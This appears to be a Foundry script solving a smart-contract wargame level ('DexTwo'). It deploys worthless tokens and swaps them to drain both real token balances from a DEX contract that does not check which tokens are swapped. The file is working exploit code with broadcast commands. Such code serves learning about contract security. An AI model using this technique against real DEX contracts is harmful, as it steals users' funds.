// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {ERC20} from "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import {IERC20} from"openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import {DexTwo} from "../src/DexTwo.sol";

contract Token is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {
        _mint(msg.sender, 101 * 10 ** decimals());
    }
}

contract DexTwoHack is Script {
    DexTwo public dexTwo =
        DexTwo(payable(0x2d81627869E586251c19f7b586FfdD71cf684cAD));

    address token1 = dexTwo.token1();
    address token2 = dexTwo.token2();

    function run() public {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(privateKey);

        address token3 = address(new Token("Token3", "TKN3"));
        address token4 = address(new Token("Token4", "TKN4"));

        IERC20(token3).transfer(address(dexTwo), 1);
        IERC20(token3).approve(address(dexTwo), 1);
        dexTwo.swap(token3, token1, 1);

        IERC20(token4).transfer(address(dexTwo), 1);
        IERC20(token4).approve(address(dexTwo), 1);
        dexTwo.swap(token4, token2, 1);

        console.log(
            "Token1 balance of dexTwo",
            dexTwo.balanceOf(token1, address(dexTwo))
        );
        console.log(
            "Token2 balance of dexTwo",
            dexTwo.balanceOf(token2, address(dexTwo))
        );
        vm.stopBroadcast();
    }
}

// forge script script/DexTwo.s.sol -vv --tc DexTwoHack
// forge script script/DexTwo.s.sol -vv --broadcast --tc DexTwoHack
